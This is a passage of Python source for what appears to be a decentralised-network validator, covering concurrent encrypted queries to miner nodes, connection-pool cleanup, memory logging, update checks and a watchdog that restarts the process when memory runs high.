                logger.debug(f"TIFF data size before serialization: {len(payload['data']['combined_data'])} bytes")
                if isinstance(payload["data"]["combined_data"], bytes):
                    logger.debug(f"TIFF header before serialization: {payload['data']['combined_data'][:4]}")

            responses = {}
            
            # Log payload memory footprint early
            try:
                import sys
                payload_size_mb = sys.getsizeof(payload) / (1024 * 1024)
                if payload_size_mb > 50:  # Log large payloads early
                    logger.warning(f"Large payload detected: {payload_size_mb:.1f}MB - will reuse same reference for all miners")
            except Exception:
                pass
            
            current_time = time.time()
            if self.metagraph is None or current_time - self.last_metagraph_sync > self.metagraph_sync_interval:
                logger.info(f"Metagraph not initialized or sync interval ({self.metagraph_sync_interval}s) exceeded. Syncing metagraph before querying miners. Last sync: {current_time - self.last_metagraph_sync if self.metagraph else 'Never'}s ago.")
                try:
                    await asyncio.wait_for(self._sync_metagraph(), timeout=60.0) 
                except asyncio.TimeoutError:
                    logger.error("Metagraph sync timed out within query_miners. Proceeding with potentially stale metagraph.")
                except Exception as e_sync:
                    logger.error(f"Error during metagraph sync in query_miners: {e_sync}. Proceeding with potentially stale metagraph.")
            else:
                logger.debug(f"Metagraph recently synced. Skipping sync for this query_miners call. Last sync: {current_time - self.last_metagraph_sync:.2f}s ago.")

            if not self.metagraph or not self.metagraph.nodes:
                logger.error("Metagraph not available or no nodes in metagraph after sync attempt. Cannot query miners.")
                return {}

            nodes_to_consider = self.metagraph.nodes
            miners_to_query = {}

            if hotkeys:
                logger.info(f"Targeting specific hotkeys: {hotkeys}")
                for hk in hotkeys:
                    if hk in nodes_to_consider:
                        miners_to_query[hk] = nodes_to_consider[hk]
                    else:
                        logger.warning(f"Specified hotkey {hk} not found in current metagraph. Skipping.")
                if not miners_to_query:
                    logger.warning(f"No specified hotkeys found in metagraph. Querying will be empty for endpoint: {endpoint}")
                    return {}
            else:
                miners_to_query = nodes_to_consider
                if self.args.test and len(miners_to_query) > 10:
                    selected_hotkeys_for_test = list(miners_to_query.keys())[-15:]
                    miners_to_query = {k: miners_to_query[k] for k in selected_hotkeys_for_test}
                    logger.info(f"Test mode: Selected the last {len(miners_to_query)} miners to query for endpoint: {endpoint} (no specific hotkeys provided).")
                elif not self.args.test:
                    logger.info(f"Querying all {len(miners_to_query)} available miners for endpoint: {endpoint} (no specific hotkeys provided).")

            if not miners_to_query:
                logger.warning(f"No miners to query for endpoint {endpoint} after filtering. Hotkeys: {hotkeys}")
                return {}

            # Ensure miner client is available
            if not hasattr(self, 'miner_client') or self.miner_client.is_closed:
                logger.warning("Miner client not available or closed, creating new one")
                # Properly close old client if it exists
                if hasattr(self, 'miner_client') and not self.miner_client.is_closed:
                    try:
                        await self.miner_client.aclose()
                        logger.debug("Closed old miner client before creating new one")
                    except Exception as e:
                        logger.debug(f"Error closing old miner client: {e}")
                
                # Create SSL context that doesn't verify certificates
                import ssl
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                self.miner_client = httpx.AsyncClient(
                    timeout=httpx.Timeout(connect=15.0, read=60.0, write=30.0, pool=10.0),  # INCREASED: More reasonable timeouts for network latency
                    follow_redirects=True,
                    verify=False,
                    limits=httpx.Limits(
                        max_connections=60,   # REDUCED: 100->60 to prevent resource exhaustion
                        max_keepalive_connections=20,  # REDUCED: 50->20 to reduce memory pressure
                        keepalive_expiry=60,  # REDUCED: 300->60 seconds for faster cleanup
                    ),
                    transport=httpx.AsyncHTTPTransport(
                        retries=2,  # INCREASED: Allow more retries for better reliability
                        verify=False,
                    ),
                )

            # HANDSHAKE PRIORITIZATION: Use separate low-concurrency for handshakes vs requests
            chunk_size = 30  # REDUCED: 50->30 for better resource management
            handshake_concurrency = 2   # VERY LOW: Only 2 concurrent handshakes to prevent event loop congestion
            request_concurrency = 8     # HIGHER: Can process more requests once handshakes are established
            chunks = []
            
            # Split miners into chunks
            miners_list = list(miners_to_query.items())
            for i in range(0, len(miners_list), chunk_size):
                chunk = dict(miners_list[i:i + chunk_size])
                chunks.append(chunk)
            
            logger.info(f"Processing {len(miners_to_query)} miners in {len(chunks)} chunks of {chunk_size}")
            logger.info(f"Handshake concurrency: {handshake_concurrency} (LOW to prevent event loop congestion)")
            logger.info(f"Request concurrency: {request_concurrency} (HIGHER once handshakes established)")

            # Configuration for immediate retries
            max_retries_per_miner = 2  # INCREASED: Allow more retry attempts for better reliability
            base_timeout = 20.0  # INCREASED: More reasonable timeout for network latency
            
            # Global handshake semaphore to prevent overwhelming the event loop
            global_handshake_semaphore = asyncio.Semaphore(handshake_concurrency)
            
            async def query_single_miner_with_retries(miner_hotkey: str, node, semaphore: asyncio.Semaphore) -> Optional[Dict]:
                """Query a single miner with PRIORITIZED handshake concurrency to prevent event loop congestion."""
                base_url = f"https://{node.ip}:{node.port}"
                process = psutil.Process() if PSUTIL_AVAILABLE else None
                
                async with semaphore: # Acquire semaphore before starting attempts for a miner
                    for attempt in range(max_retries_per_miner):
                        attempt_timeout = base_timeout + (attempt * 5.0)  # Progressive timeout
                        
                        try:
                            logger.debug(f"Miner {miner_hotkey} attempt {attempt + 1}/{max_retries_per_miner}")
                            
                            # PRIORITIZED HANDSHAKE: Use separate global low-concurrency semaphore
                            handshake_start_time = time.time()
                            symmetric_key_str = None
                            symmetric_key_uuid = None
                            
                            try:
                                # HANDSHAKE PHASE: Limited to 2 concurrent to prevent event loop congestion
                                async with global_handshake_semaphore:
                                    logger.debug(f"🤝 Starting handshake for {miner_hotkey} (global handshake #{global_handshake_semaphore._value})")
                                    
                                    # Get public key
                                    public_key_encryption_key = await asyncio.wait_for(
                                        handshake.get_public_encryption_key(
                                            self.miner_client, 
                                            base_url, 
                                            timeout=int(attempt_timeout)
                                        ),
                                        timeout=attempt_timeout
                                    )
                                    
                                    # Generate symmetric key
                                    symmetric_key: bytes = os.urandom(32)
                                    symmetric_key_uuid = os.urandom(32).hex()
                                    
                                    # Send symmetric key
                                    success = await asyncio.wait_for(
                                        handshake.send_symmetric_key_to_server(
                                            self.miner_client,
                                            base_url,
                                            self.keypair,
                                            public_key_encryption_key,
                                            symmetric_key,
                                            symmetric_key_uuid,
                                            miner_hotkey,
                                            timeout=int(attempt_timeout),
                                        ),
                                        timeout=attempt_timeout
                                    )
                                    
                                    if not success:
                                        raise Exception("Handshake failed: server returned unsuccessful status")
                                        
                                    symmetric_key_str = base64.b64encode(symmetric_key).decode()
                                    
                                    logger.debug(f"✅ Handshake with {miner_hotkey} completed in {time.time() - handshake_start_time:.2f}s")
                                        
                            except Exception as hs_err:
                                logger.debug(f"Handshake failed for miner {miner_hotkey} attempt {attempt + 1}: {type(hs_err).__name__}")
                                if attempt < max_retries_per_miner - 1:
                                    await asyncio.sleep(0.5 * (attempt + 1))  # Brief delay before retry
                                    continue
                                return {"hotkey": miner_hotkey, "status": "failed", "reason": "Handshake Error", "details": f"{type(hs_err).__name__}"}

                            if process:
                                logger.debug(f"Memory after handshake ({miner_hotkey}): {process.memory_info().rss / (1024*1024):.2f} MB")
                            
                            fernet = Fernet(symmetric_key_str)
                            
                            # Make the actual request - REUSE THE SAME PAYLOAD REFERENCE
                            try:
                                logger.debug(f"📡 Making request to {miner_hotkey} (attempt {attempt + 1})")
                                request_start_time = time.time()
                                
                                resp = await asyncio.wait_for(
                                    vali_client.make_non_streamed_post(
                                        httpx_client=self.miner_client,
                                        server_address=base_url,
                                        fernet=fernet,
                                        keypair=self.keypair,
                                        symmetric_key_uuid=symmetric_key_uuid,
                                        validator_ss58_address=self.keypair.ss58_address,
                                        miner_ss58_address=miner_hotkey,
                                        payload=payload,  # REUSE SAME PAYLOAD REFERENCE - NO COPYING!
                                        endpoint=endpoint,
                                    ),
                                    timeout=45.0  # REDUCED: 240s->45s to prevent connection hanging
                                )
                                request_duration = time.time() - request_start_time
                                
                                # Immediate cleanup of cryptographic objects and large variables
                                try:
                                    # Clear Fernet cipher and symmetric key data
                                    if hasattr(fernet, '__dict__'):
                                        fernet.__dict__.clear()
                                    del fernet
                                    
                                    # Clear symmetric key variables
                                    symmetric_key = None
                                    del symmetric_key_str
                                    del symmetric_key_uuid
                                    
                                    # Clear request response data if it's large
                                    if resp and hasattr(resp, 'content') and len(resp.content) > 1024*1024:  # > 1MB
                                        logger.debug(f"Clearing large response content for {miner_hotkey}: {len(resp.content)} bytes")
                                        
                                except Exception as cleanup_err:
                                    logger.debug(f"Non-critical cleanup error for {miner_hotkey}: {cleanup_err}")
                                
                                if process:
                                    mem_after = process.memory_info().rss / (1024*1024)
                                    logger.debug(f"Memory after request ({miner_hotkey}): {mem_after:.2f} MB")
                                
                                if resp and resp.status_code < 400:
                                    response_data = {
                                        "status": "success",
                                        "text": resp.text,
                                        "status_code": resp.status_code,
                                        "hotkey": miner_hotkey,
                                        "port": node.port,
                                        "ip": node.ip,
                                        "duration": request_duration,
                                        "content_length": len(resp.content) if resp.content else 0,
                                        "attempts_used": attempt + 1
                                    }
                                    logger.info(f"SUCCESS: {miner_hotkey} responded in {request_duration:.2f}s (attempt {attempt + 1})")
                                    return response_data # Success, return immediately
                                else:
                                    logger.debug(f"Bad response from {miner_hotkey} attempt {attempt + 1}: status {resp.status_code if resp else 'None'}")
                                    if attempt < max_retries_per_miner - 1:
                                        await asyncio.sleep(0.5 * (attempt + 1))
                                        continue # Go to next attempt for this miner
                                    return {"hotkey": miner_hotkey, "status": "failed", "reason": "Bad Response", "details": f"Status code {resp.status_code if resp else 'N/A'}"}

                            except asyncio.TimeoutError:
                                # This is a specific type of request error, so we can categorize it
                                if attempt < max_retries_per_miner - 1:
                                    await asyncio.sleep(0.5 * (attempt + 1))
                                    continue
                                return {"hotkey": miner_hotkey, "status": "failed", "reason": "Request Timeout", "details": "Timeout during non-streamed POST"}
                            except Exception as request_error:
                                # Enhanced cleanup on error
                                try:
                                    if 'fernet' in locals() and fernet:
                                        if hasattr(fernet, '__dict__'):
                                            fernet.__dict__.clear()
                                        del fernet
                                    if 'symmetric_key_str' in locals():
                                        del symmetric_key_str
                                    if 'symmetric_key_uuid' in locals():
                                        del symmetric_key_uuid
                                    if 'symmetric_key' in locals():
                                        symmetric_key = None
                                except Exception:
                                    pass
                                    
                                logger.debug(f"Request error for {miner_hotkey} attempt {attempt + 1}: {type(request_error).__name__}")
                                if attempt < max_retries_per_miner - 1:
                                    await asyncio.sleep(0.5 * (attempt + 1))
                                    continue # Go to next attempt for this miner
                                return {"hotkey": miner_hotkey, "status": "failed", "reason": "Request Error", "details": f"{type(request_error).__name__}"}
                                
                        except Exception as outer_error: # Catch errors within the attempt loop but outside handshake/request
                            logger.debug(f"Outer error for {miner_hotkey} attempt {attempt + 1}: {type(outer_error).__name__} - {outer_error}")
                            if attempt < max_retries_per_miner - 1:
                                await asyncio.sleep(0.5 * (attempt + 1))
                                continue # Go to next attempt for this miner
                            return {"hotkey": miner_hotkey, "status": "failed", "reason": "Outer Error", "details": f"{type(outer_error).__name__}"}
                    
                    # If loop finishes, all attempts for this miner failed (should be caught by returns above but as a fallback)
                    logger.debug(f"All {max_retries_per_miner} attempts failed for {miner_hotkey} (fallback).")
                    return {"hotkey": miner_hotkey, "status": "failed", "reason": "All Attempts Failed", "details": "Fell through retry loop"}
                # Semaphore is automatically released when async with block exits

            # Process miners in chunks to reduce database contention and memory usage
            logger.info(f"Starting chunked processing of {len(chunks)} chunks...")
            start_time = time.time()
            successful_responses = {}  # Final results only
            
            # Log memory before launching queries
            self._log_memory_usage("query_miners_start")
            
            for chunk_idx, chunk_miners in enumerate(chunks):
                chunk_start_time = time.time()
                logger.info(f"Processing chunk {chunk_idx + 1}/{len(chunks)} with {len(chunk_miners)} miners...")
                
                # Create semaphore for this chunk (request processing, higher concurrency)
                chunk_semaphore = asyncio.Semaphore(request_concurrency)
                
                # Create tasks for this chunk only
                chunk_tasks = []
                for hotkey, node in chunk_miners.items():
                    if node.ip and node.port:
                        task = asyncio.create_task(
                            query_single_miner_with_retries(hotkey, node, chunk_semaphore),
                            name=f"query_chunk{chunk_idx}_{hotkey[:8]}"
                        )
                        chunk_tasks.append((hotkey, task))
                    else:
                        logger.warning(f"Skipping miner {hotkey} - missing IP or port")

                # Process this chunk's responses
                completed_count = 0
                
                # Create a mapping for this chunk
                task_to_hotkey = {task: hotkey for hotkey, task in chunk_tasks}
                just_tasks = [task for _, task in chunk_tasks]
                
                if just_tasks:  # Only process if we have tasks
                    for completed_task in asyncio.as_completed(just_tasks):
                        completed_count += 1
                        try:
                            result = await completed_task
                            if result and result.get('status') == 'success':
                                # Only keep successful results in final collection
                                successful_responses[result['hotkey']] = result
                        except Exception as e:
                            task_hotkey = task_to_hotkey.get(completed_task, "unknown")
                            logger.debug(f"Exception processing response in chunk {chunk_idx + 1}: {e}")

                chunk_time = time.time() - chunk_start_time
                chunk_successful = len([r for r in successful_responses.values() if r.get('hotkey') in chunk_miners])
                chunk_failed = len(chunk_miners) - chunk_successful
                logger.info(f"Chunk {chunk_idx + 1}/{len(chunks)} completed: {chunk_successful} successful, {chunk_failed} failed in {chunk_time:.2f}s")
                
                # AGGRESSIVE CLEANUP BETWEEN CHUNKS
                try:
                    del chunk_tasks
                    del task_to_hotkey
                    del just_tasks
                    del chunk_semaphore
                    
                    # Force garbage collection between chunks to manage memory
                    if chunk_idx % 3 == 0:  # Every 3 chunks
                        import gc
                        collected = gc.collect()
                        if collected > 20:
                            logger.debug(f"GC collected {collected} objects after chunk {chunk_idx + 1}")
                except Exception as cleanup_err:
                    logger.debug(f"Error during chunk cleanup: {cleanup_err}")
                
                # Aggressive connection cleanup between chunks to prevent accumulation
                if chunk_idx < len(chunks) - 1:  # Don't delay after the last chunk
                    await asyncio.sleep(0.5)  # 500ms delay between chunks
                    
                    # Force connection cleanup every few chunks to prevent SSL hanging
                    if (chunk_idx + 1) % 3 == 0:  # Every 3 chunks
                        await self._aggressive_connection_cleanup()

            total_time = time.time() - start_time
            
            # Final summary logging
            total_queries = sum(len(chunk) for chunk in chunks)
            success_count = len(successful_responses)
            failed_count = total_queries - success_count
            success_rate = success_count / total_queries * 100 if total_queries > 0 else 0
            avg_rate = total_queries / total_time if total_time > 0 else 0

            logger.info(f"Query Summary - Total: {total_queries}, Success: {success_count} ({success_rate:.1f}%), "
                       f"Failed: {failed_count}, Time: {total_time:.2f}s, Rate: {avg_rate:.1f} queries/sec")
            
            # FINAL AGGRESSIVE CLEANUP
            try:
                # Clear all chunk references
                del chunks
                del miners_list
                del miners_to_query  # Clear the large metagraph subset
                
                # Force final garbage collection
                import gc
                collected = gc.collect()
                if collected > 100:  # Log significant cleanup
                    logger.info(f"Final cleanup: GC collected {collected} objects after miner queries")
                        
            except Exception as cleanup_error:
                logger.warning(f"Error during final query cleanup: {cleanup_error}")
            
            # Log memory after cleanup to verify effectiveness
            self._log_memory_usage("query_miners_end")
            
            # Clean up connections after query batch completes
            await self._cleanup_idle_connections()
            
            return successful_responses

        except Exception as e:
            logger.error(f"Error querying miners: {e}")
            logger.error(traceback.format_exc())
            return {}

    async def _cleanup_idle_connections(self):
        """Clean up idle connections in the HTTP client pool, but only stale ones."""
        try:
            if hasattr(self, 'miner_client') and not self.miner_client.is_closed:
                # Force close idle connections by accessing the transport pool
                if hasattr(self.miner_client, '_transport') and hasattr(self.miner_client._transport, '_pool'):
                    pool = self.miner_client._transport._pool
                    if hasattr(pool, '_connections'):
                        connections = pool._connections
                        closed_count = 0
                        
                        # Handle both dict and list cases
                        if hasattr(connections, 'items'):  # Dict-like
                            connection_items = list(connections.items())
                            for key, conn in connection_items:
                                # Only close connections that have been idle for a while
                                # This preserves recent connections for potential reuse
                                if (hasattr(conn, 'is_idle') and conn.is_idle() and 
                                    hasattr(conn, '_idle_time') and 
                                    getattr(conn, '_idle_time', 0) > 60):  # 60 seconds idle
                                    try:
                                        await conn.aclose()
                                        del connections[key]
                                        closed_count += 1
                                        logger.debug(f"Closed stale idle connection to {key}")
                                    except Exception as e:
                                        logger.debug(f"Error closing idle connection: {e}")
                        else:  # List-like
                            for conn in list(connections):
                                if (hasattr(conn, 'is_idle') and conn.is_idle() and 
                                    hasattr(conn, '_idle_time') and 
                                    getattr(conn, '_idle_time', 0) > 60):  # 60 seconds idle
                                    try:
                                        await conn.aclose()
                                        connections.remove(conn)
                                        closed_count += 1
                                        logger.debug(f"Closed stale idle connection")
                                    except Exception as e:
                                        logger.debug(f"Error closing idle connection: {e}")
                    
                        if closed_count > 0:
                            logger.info(f"Cleaned up {closed_count} stale idle connections")
                        else:
                            logger.debug("No stale connections found to clean up")
                        
        except Exception as e:
            logger.debug(f"Error during connection cleanup: {e}")

    async def _aggressive_connection_cleanup(self):
        """Aggressively close all idle and potentially hanging connections."""
        try:
            if hasattr(self, 'miner_client') and not self.miner_client.is_closed:
                # Force close ALL idle connections, not just stale ones
                if hasattr(self.miner_client, '_transport') and hasattr(self.miner_client._transport, '_pool'):
                    pool = self.miner_client._transport._pool
                    if hasattr(pool, '_connections'):
                        connections = pool._connections
                        closed_count = 0
                        
                        # Handle both dict and list cases
                        if hasattr(connections, 'items'):  # Dict-like
                            connection_items = list(connections.items())
                            for key, conn in connection_items:
                                # Close ALL idle connections (no time check)
                                if hasattr(conn, 'is_idle') and conn.is_idle():
                                    try:
                                        await conn.aclose()
                                        del connections[key]
                                        closed_count += 1
                                        logger.debug(f"Aggressively closed idle connection to {key}")
                                    except Exception as e:
                                        logger.debug(f"Error closing connection: {e}")
                        else:  # List-like
                            for conn in list(connections):
                                if hasattr(conn, 'is_idle') and conn.is_idle():
                                    try:
                                        await conn.aclose()
                                        connections.remove(conn)
                                        closed_count += 1
                                        logger.debug(f"Aggressively closed idle connection")
                                    except Exception as e:
                                        logger.debug(f"Error closing connection: {e}")
                    
                        if closed_count > 0:
                            logger.info(f"Aggressively cleaned up {closed_count} idle connections")
                        
        except Exception as e:
            logger.debug(f"Error during aggressive connection cleanup: {e}")

    def _log_memory_usage(self, context: str, threshold_mb: float = 100.0):
        """Enhanced memory logging with detailed breakdown and automatic cleanup."""
        if not PSUTIL_AVAILABLE:
            return
            
        try:
            process = psutil.Process()
            current_memory = process.memory_info().rss / (1024 * 1024)
            
            # Calculate memory change
            if not hasattr(self, '_last_memory'):
                self._last_memory = current_memory
                memory_change = 0
            else:
                memory_change = current_memory - self._last_memory
                self._last_memory = current_memory
            
            # Enhanced logging for significant changes
            if abs(memory_change) > threshold_mb or context in ['calc_weights_start', 'calc_weights_after_cleanup']:
                # Get additional memory details
                memory_info = process.memory_info()
                try:
                    # Try to get memory percentage
                    memory_percent = process.memory_percent()
                    
                    # Get thread and file handle counts
                    num_threads = process.num_threads()
                    open_files = len(process.open_files())
                    
                    # Check if we have tracemalloc data
                    tracemalloc_info = ""
                    if tracemalloc.is_tracing():
                        try:
                            current, peak = tracemalloc.get_traced_memory()
                            tracemalloc_info = f", Traced: {current/(1024*1024):.1f}MB (peak: {peak/(1024*1024):.1f}MB)"
                        except Exception:
                            pass
                    
                    logger.info(
                        f"Memory usage [{context}]: {current_memory:.1f}MB "
                        f"({'+' if memory_change > 0 else ''}{memory_change:.1f}MB), "
                        f"RSS: {memory_info.rss/(1024*1024):.1f}MB, "
                        f"VMS: {memory_info.vms/(1024*1024):.1f}MB, "
                        f"Percent: {memory_percent:.1f}%, "
                        f"Threads: {num_threads}, "
                        f"Files: {open_files}"
                        f"{tracemalloc_info}"
                    )
                    
                    # Log large memory increases but let unified periodic cleanup handle them
                    if memory_change > 200:
                        if hasattr(self, 'last_metagraph_sync'):
                            logger.info(f"Large memory increase detected ({memory_change:.1f}MB) - periodic cleanup will handle if needed")
                        else:
                            logger.info(f"Large memory increase detected during startup ({memory_change:.1f}MB) - normal for initialization")
                        
                except Exception as e:
                    logger.info(f"Memory usage [{context}]: {current_memory:.1f}MB ({'+' if memory_change > 0 else ''}{memory_change:.1f}MB) - detailed info error: {e}")
            else:
                logger.debug(f"Memory usage [{context}]: {current_memory:.1f}MB ({'+' if memory_change > 0 else ''}{memory_change:.1f}MB)")
                
        except Exception as e:
            logger.debug(f"Error logging memory usage for {context}: {e}")

    async def check_for_updates(self):
        """Check for and apply updates every 5 minutes."""
        while True:
            try:
                logger.info("Checking for updates...")
                # Add timeout to prevent hanging
                try:
                    update_successful = await asyncio.wait_for(
                        perform_update(self),
                        timeout=180  # 3 minute timeout to allow for cleanup and restart
                    )

                    if update_successful:
                        logger.info("Update completed successfully")
                    else:
                        logger.debug("No updates available or update failed")

                except asyncio.TimeoutError:
                    logger.warning("Update check timed out after 3 minutes")
                except Exception as e:
                    if "500" in str(e):
                        logger.warning(f"GitHub temporarily unavailable (500 error): {e}")
                    else:
                        logger.error(f"Error in update checker: {e}")
                        logger.error(traceback.format_exc())

            except Exception as outer_e:
                logger.error(f"Outer error in update checker: {outer_e}")
                logger.error(traceback.format_exc())

            await asyncio.sleep(300)  # Check every 5 minutes

    async def update_task_status(self, task_name: str, status: str, operation: Optional[str] = None):
        """Update task status and operation tracking."""
        if task_name in self.task_health:
            health = self.task_health[task_name]
            health['status'] = status
            
            if operation:
                if operation != health.get('current_operation'):
                    health['current_operation'] = operation
                    health['operation_start'] = time.time()
                    # Track initial resource usage when operation starts
                    try:
                        import psutil
                        process = psutil.Process()
                        health['resources']['memory_start'] = process.memory_info().rss
                        health['resources']['memory_peak'] = health['resources']['memory_start']
                        health['resources']['cpu_percent'] = process.cpu_percent()
                        health['resources']['open_files'] = len(process.open_files())
                        health['resources']['threads'] = process.num_threads()
                        health['resources']['last_update'] = time.time()
                        logger.info(
                            f"Task {task_name} started operation: {operation} | "
                            f"Initial Memory: {health['resources']['memory_start'] / (1024*1024):.2f}MB"
                        )
                    except ImportError:
                        logger.warning("psutil not available for resource tracking")
            elif status == 'idle':
                if health.get('current_operation'):
                    # Log resource usage when operation completes
                    try:
                        import psutil
                        process = psutil.Process()
                        current_memory = process.memory_info().rss
                        memory_change = current_memory - health['resources']['memory_start']
                        peak_memory = max(current_memory, health['resources'].get('memory_peak', 0))
                        logger.info(
                            f"Task {task_name} completed operation: {health['current_operation']} | "
                            f"Memory Change: {memory_change / (1024*1024):.2f}MB | "
                            f"Peak Memory: {peak_memory / (1024*1024):.2f}MB"
                        )
                    except ImportError:
                        pass
                health['current_operation'] = None
                health['operation_start'] = None
                health['last_success'] = time.time()

    async def start_watchdog(self):
        """Start the watchdog in a separate thread."""
        if not self.watchdog_running:
            self.watchdog_running = True
            logger.info("Started watchdog")
            
            # Log memory monitoring configuration
            if self.memory_monitor_enabled:
                try:
                    import psutil
                    system_memory = psutil.virtual_memory()
                    logger.info(f"🔍 Validator memory monitoring enabled:")
                    logger.info(f"  System memory: {system_memory.total / (1024**3):.1f} GB total, {system_memory.available / (1024**3):.1f} GB available")
                    logger.info(f"  Memory thresholds: Warning={self.memory_warning_threshold_mb}MB, Emergency={self.memory_emergency_threshold_mb}MB, Critical={self.memory_critical_threshold_mb}MB")
                    logger.info(f"  PM2 restart enabled: {self.pm2_restart_enabled}")
                    if self.pm2_restart_enabled:
                        # Check multiple possible PM2 environment variables
                        pm2_id = (os.getenv('pm_id') or 
                                 os.getenv('NODE_APP_INSTANCE') or 
                                 os.getenv('PM2_INSTANCE_ID') or 
                                 'not detected')
                        logger.info(f"  PM2 instance ID: {pm2_id}")
                        
                        # Also try to get the process name dynamically
                        try:
                            process_name = await self._get_pm2_process_name()
                            if process_name:
                                logger.info(f"  PM2 process name: {process_name}")
                            else:
                                logger.info(f"  PM2 process name: not detected")
                        except Exception as e:
                            logger.debug(f"Error getting PM2 process name during startup: {e}")
                except ImportError:
                    logger.warning("psutil not available - memory monitoring will be disabled")
                    self.memory_monitor_enabled = False
            else:
                logger.info("Validator memory monitoring disabled by configuration")
            
            self.create_tracked_task(self._watchdog_loop(), "watchdog_loop")

    async def _watchdog_loop(self):
        """Run the watchdog monitoring in the main event loop."""
        while self.watchdog_running:
            try:
                # Add timeout to prevent long execution
                # Note: Increased from 30s to 150s to accommodate metagraph sync (120s) plus buffer
                try:
                    await asyncio.wait_for(
                        self._watchdog_check(),
                        timeout=150  # 150 second timeout (120s for metagraph sync + 30s buffer)
                    )
                except asyncio.TimeoutError:
                    logger.error("Watchdog check timed out after 150 seconds")
                except Exception as e:
                    logger.error(f"Error in watchdog loop: {e}")
                    logger.error(traceback.format_exc())
            except Exception as outer_e:
                logger.error(f"Outer error in watchdog: {outer_e}")
                logger.error(traceback.format_exc())
            await asyncio.sleep(60)  # Check every minute

    async def stop_watchdog(self):
        """Stop the watchdog."""
        if self.watchdog_running:
            self.watchdog_running = False
            logger.info("Stopped watchdog")

    async def _watchdog_check(self):
        """Perform a single watchdog check iteration."""
        try:
            current_time = time.time()
            
            # Memory monitoring check (first priority)
            if self.memory_monitor_enabled:
                try:
                    await asyncio.wait_for(
                        self._check_memory_usage(current_time),
                        timeout=5  # 5 second timeout for memory check
                    )
                except asyncio.TimeoutError:
                    logger.error("Memory usage check timed out")
                except Exception as e:
                    logger.error(f"Error checking memory usage: {e}")
            
            # Update resource usage for all active tasks
            try:
                await asyncio.wait_for(
                    self._check_resource_usage(current_time),
                    timeout=10  # 10 second timeout
                )
            except asyncio.TimeoutError:
                logger.error("Resource usage check timed out")
            except Exception as e:
                logger.error(f"Error checking resource usage: {e}")

            # Check task health with timeout
            try:
                await asyncio.wait_for(
                    self._check_task_health(current_time),
                    timeout=10  # 10 second timeout
                )
            except asyncio.TimeoutError:
                logger.error("Task health check timed out")
            except Exception as e:
                logger.error(f"Error checking task health: {e}")
            
            # Check metagraph sync health with timeout
            if current_time - self.last_metagraph_sync > self.metagraph_sync_interval:
                try:
                    await asyncio.wait_for(
                        self._sync_metagraph(),
                        timeout=120  # 120 second timeout (allows for substrate network delays)
                    )
                except asyncio.TimeoutError:
                    logger.error("Metagraph sync timed out")
                except Exception as e:
                    logger.error(f"Metagraph sync failed: {e}")

        except Exception as e:
            logger.error(f"Error in watchdog check: {e}")
            logger.error(traceback.format_exc())

    async def _check_memory_usage(self, current_time):
        """Check overall validator memory usage and trigger restart if needed."""
        try:
            import psutil
            import gc
            
            process = psutil.Process()
            memory_info = process.memory_info()
            memory_mb = memory_info.rss / (1024 * 1024)
            
            system_memory = psutil.virtual_memory()
            system_percent = system_memory.percent
            
            # Regular memory status logging
            if current_time - self.last_memory_log_time > self.memory_log_interval:
                logger.info(f"🔍 Validator memory status: {memory_mb:.1f} MB RSS ({system_percent:.1f}% system memory)")
                self.last_memory_log_time = current_time
            
            # Check if we're in a critical operation that shouldn't be interrupted
            critical_operations_active = self._check_critical_operations_active()
            
            # AGGRESSIVE MEMORY MONITORING: Restart quickly when limits exceeded
            if memory_mb > self.memory_critical_threshold_mb:
                logger.error(f"💀 CRITICAL MEMORY: {memory_mb:.1f} MB - OOM imminent! (threshold: {self.memory_critical_threshold_mb} MB)")
                
                if critical_operations_active:
                    logger.warning(f"⚠️  Critical operations active: {critical_operations_active}. Will wait maximum 30 seconds before forced restart.")
                    
                    # Only wait briefly for truly critical operations (weight_setting only)
                    # Try emergency GC but prepare for forced restart if memory stays critical
                    if current_time - self.last_emergency_gc_time > 15:  # Reduced cooldown to 15 seconds
                        logger.error("Attempting emergency garbage collection while critical operations are active...")
                        try:
                            collected = gc.collect()
                            logger.error(f"Emergency GC freed {collected} objects")
                            self.last_emergency_gc_time = current_time
                            
                            # Check memory immediately after GC
                            immediate_post_gc_memory = process.memory_info().rss / (1024 * 1024)
                            if immediate_post_gc_memory > (self.memory_critical_threshold_mb * 0.95):  # Still >95% of critical
                                logger.error(f"🚨 GC INEFFECTIVE: Memory still {immediate_post_gc_memory:.1f} MB after emergency GC")
                                if self.pm2_restart_enabled:
                                    logger.error(f"🔄 FORCED RESTART: Cannot wait for critical operations - OOM imminent!")
                                    await self._trigger_pm2_restart("Forced restart - GC ineffective and OOM imminent")
                                    return
                            
                        except Exception as gc_err:
                            logger.error(f"Emergency GC failed during critical operation: {gc_err}")
                            if self.pm2_restart_enabled:
                                logger.error(f"🔄 FORCED RESTART: GC failed and OOM imminent!")
                                await self._trigger_pm2_restart("Forced restart - GC failed during critical operation")
                                return
                else:
                    # NO critical operations - restart immediately after quick GC attempt
                    logger.error("NO CRITICAL OPERATIONS - immediate restart after emergency GC...")
                    try:
                        collected = gc.collect()
                        logger.error(f"Emergency GC freed {collected} objects before restart")
                        await asyncio.sleep(1)  # Very brief pause - 1 second only
                        
                        # Check memory again after GC - be more aggressive about restart threshold
                        post_gc_memory = process.memory_info().rss / (1024 * 1024)
                        if post_gc_memory > (self.memory_critical_threshold_mb * 0.85):  # Restart if still >85% of critical
                            if self.pm2_restart_enabled:
                                logger.error(f"🔄 TRIGGERING IMMEDIATE PM2 RESTART: Memory still high after GC ({post_gc_memory:.1f} MB)")
                                await self._trigger_pm2_restart("Immediate restart - memory still critical after GC")
                                return  # Exit the monitoring
                            else:
                                logger.error(f"💀 MEMORY CRITICAL BUT PM2 RESTART DISABLED: {post_gc_memory:.1f} MB - system will likely be killed by OOM")
                        else:
                            logger.info(f"✅ Memory reduced to {post_gc_memory:.1f} MB after GC - continuing with monitoring")
                    except Exception as gc_err:
                        logger.error(f"Emergency GC failed: {gc_err}")
                        if self.pm2_restart_enabled:
                            logger.error(f"🔄 IMMEDIATE RESTART: GC failed and memory critical")
                            await self._trigger_pm2_restart("Immediate restart - GC failed and memory critical")
                            return
                        else:
                            logger.error("💀 GC FAILED AND PM2 RESTART DISABLED - system will likely crash")
                            
            elif memory_mb > self.memory_emergency_threshold_mb:
                logger.warning(f"🚨 EMERGENCY MEMORY PRESSURE: {memory_mb:.1f} MB - OOM risk HIGH! (threshold: {self.memory_emergency_threshold_mb} MB)")
                
                # AGGRESSIVE: If emergency level persists, prepare for restart
